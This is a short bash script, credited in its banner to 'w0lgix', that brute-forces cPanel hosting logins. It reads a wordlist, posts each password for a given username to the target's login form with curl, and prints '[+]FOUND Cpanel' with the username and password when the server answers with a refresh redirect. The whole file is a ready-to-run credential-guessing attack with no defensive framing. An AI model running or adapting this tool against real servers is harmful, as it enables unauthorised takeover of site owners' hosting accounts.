#!/bin/bash

if [[ $# -eq 0 || $# -eq 1 || $# -eq 2 ]] ;then
echo "###################################################"
echo "#https://www.facebook.com/Officiel.mhmad          #"
echo "#                                                 #"
echo "# ░░░░░░███████ ]▄▄▄▄▄▄▄▄                         #"
echo "#▂▄▅█████████▅▄▃▂                                 #"
echo "#I███████████████████].                           #"
echo "#◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...                               #"
echo "#                Coded by w0lgix                  #"
echo "#                 v1.0                            #"
echo "#                                                 #"
echo "#            Using ./cpanel.sh                    #"
echo "###################################################"
echo -e "[+] using [site:2082] [username] [wordlist]"
exit
fi

#check if file
if [ -f $2 ]; #if file inside here
then

password=`cat $3`

for password in $password
do

curl -s  $1 --data  "user="$2"&pass="$password"&login=" | grep  'HTTP-EQUIV="refresh"' | sed 's/<html><head><META HTTP-EQUIV="refresh" CONTENT="2;URL=/''\n[+]FOUND Cpanel: '$2' pass: '$password' \n\n/g'

done
##################################################
else # if not file 

password=`cat $3`

for password in $password
do

curl -s  $1/login --data  "user="$2"&pass="$password"&login=" | grep  'HTTP-EQUIV="refresh"' | sed 's/<html><head><META HTTP-EQUIV="refresh" CONTENT="2;URL=/''\n[+]FOUND Cpanel: '$2' pass: '$password' \n\n/g'

done

fi
